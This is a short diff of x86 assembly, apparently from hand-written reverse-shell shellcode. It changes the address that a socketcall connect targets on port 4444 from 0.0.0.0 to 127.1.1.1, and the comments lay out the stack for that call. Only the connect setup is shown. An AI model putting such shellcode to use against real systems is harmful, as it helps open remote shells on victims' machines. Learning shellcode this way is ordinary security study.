@@ -29,10 +29,10 @@ _start:
         ; eax = 0x66 (socketcall)
         ; ebx = 0x3 (connect)
         ; ecx = esp
-        ; esp => |----------|----------|0x00000018|0x0002|0x115C|0x00000000|
+        ; esp => |----------|----------|0x00000018|0x0002|0x115C|0x7f010101|
         ;           sockfd      addr      addrlen  AF_INET  port   ipaddr
 
-	push 0x00000000		; ipaddr, 0.0.0.0
+	push 0x0101017f		; ipaddr, 127.1.1.1
 	push word 0x5c11	; port, 4444
 	push word 0x2		; AF_INET
 	mov ecx, esp
